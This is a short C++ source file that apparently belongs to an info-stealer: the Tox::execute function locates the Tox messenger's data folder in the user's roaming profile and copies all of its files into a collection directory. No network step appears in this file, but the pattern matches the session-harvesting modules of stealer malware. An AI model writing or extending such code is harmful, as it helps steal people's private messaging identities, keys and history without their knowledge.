//
// Created by .1qxz on 11.06.2024.
//

#include "Tox.h"

static const fs::path SESSION_PATH = Utils::getRoamingPath() / "Tox";

void Tox::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(SESSION_PATH);

    if(paths.empty())
        return;

    fs::path dst = root / "Tox";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}
